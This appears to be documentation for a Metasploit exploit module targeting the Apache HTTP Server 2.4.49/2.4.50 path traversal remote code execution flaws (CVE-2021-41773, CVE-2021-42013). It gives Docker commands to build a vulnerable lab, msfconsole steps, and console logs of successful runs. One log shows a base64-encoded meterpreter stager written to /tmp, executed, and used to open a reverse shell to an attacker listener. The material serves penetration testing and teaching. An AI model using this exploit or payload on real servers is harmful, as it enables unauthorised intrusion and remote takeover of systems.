This module exploits an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773)
and 2.4.50 (CVE-2021-42013).

A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a
path traversal attack to map URLs to files outside the expected document root.

If files outside of the document root are not protected by "require all denied" these requests can succeed.

Additionally this flaw could leak the source of interpreted files like CGI scripts.

If CGI scripts are also enabled for these aliased paths, this could allow for remote code execution.

It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient (CVE-2021-42013).

## Vulnerable Application

This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and Apache 2.4.50 and
not earlier versions.

### Make your lab

```
docker run -dit --name CVE-2021-41773 -p 8080:80 -v /opt/apache2.4.49:/usr/local/apache2/htdocs httpd:2.4.49
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i -E "s|all denied|all granted|g; s|#(.* cgid_.*)|\1|g" conf/httpd.conf
docker stop CVE-2021-41773
docker start CVE-2021-41773
```

--or--

```
docker run -dit --name CVE-2021-42013 -p 8080:80 -v /opt/apache2.4.50:/usr/local/apache2/htdocs httpd:2.4.50
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker exec -it CVE-2021-42013 sed -i -E "s|all denied|all granted|g; s|#(.* cgid_.*)|\1|g" conf/httpd.conf
docker stop CVE-2021-42013
docker start CVE-2021-42013
```

## Verification Steps

1. Start `msfconsole`
2. `use exploit/multi/http/apache_normalize_path_rce`
3. `set RHOSTS [IP]`
4. `set LHOST [IP]`
5. `run`

## Options

**CVE**

The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013). Default: CVE-2021-42013

**DEPTH**

Depth for path traversal. Default: 5

**TARGETURI**

Base path. Default: `/cgi-bin`

## Scenarios

### Command Line Interface

```
msf6 exploit(multi/http/apache_normalize_path_rce) > use exploit/multi/http/apache_normalize_path_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > set target 1
target => 1
msf6 exploit(multi/http/apache_normalize_path_rce) > setg rhosts 172.20.4.11
rhosts => 172.20.4.11
msf6 exploit(multi/http/apache_normalize_path_rce) > setg rport 8080
rport => 8080
msf6 exploit(multi/http/apache_normalize_path_rce) > setg ssl false
ssl => false
msf6 exploit(multi/http/apache_normalize_path_rce) > setg verbose true
verbose => true
msf6 exploit(multi/http/apache_normalize_path_rce) > set cmd uname -a
cmd => uname -a
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[+] uname -a
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://172.20.4.11:8080 - Attempt to exploit for CVE-2021-42013
[*] http://172.20.4.11:8080 - Generated payload: uname -a
[!] http://172.20.4.11:8080 - Dumping command output in response
Linux 184ef33f9859 5.14.0-1-amd64 #1 SMP Debian 5.14.6-3 (2021-09-28) x86_64 GNU/Linux

msf6 exploit(multi/http/apache_normalize_path_rce) > 
```

### Meterpreter

```
msf6 exploit(multi/http/apache_normalize_path_rce) > use exploit/multi/http/apache_normalize_path_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > setg rhosts 172.20.4.11
rhosts => 172.20.4.11
msf6 exploit(multi/http/apache_normalize_path_rce) > setg rport 8080
rport => 8080
msf6 exploit(multi/http/apache_normalize_path_rce) > setg ssl false
ssl => false
msf6 exploit(multi/http/apache_normalize_path_rce) > setg verbose true
verbose => true
msf6 exploit(multi/http/apache_normalize_path_rce) > set lhost 172.20.7.36
lhost => 172.20.7.36
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 172.20.7.36:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://172.20.4.11:8080 - Attempt to exploit for CVE-2021-42013
[*] http://172.20.4.11:8080 - Sending linux/x64/meterpreter/reverse_tcp command payload
[*] http://172.20.4.11:8080 - Generated command payload: echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAASDH/aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXKwUByRRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g== | base64 -d > /tmp/PJaT; chmod +x /tmp/PJaT; /tmp/PJaT; rm -f /tmp/PJaT
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3012548 bytes) to 172.20.4.11
[*] Meterpreter session 1 opened (172.20.7.36:4444 -> 172.20.4.11:48540) at 2021-10-08 13:58:13 +0400
[!] This exploit may require manual cleanup of '/tmp/PJaT' on the target

meterpreter >
```

## References

  1. <https://httpd.apache.org/security/vulnerabilities_24.html>
  2. <https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse>
  3. <https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml>
  4. <https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74>
  5. <https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis>
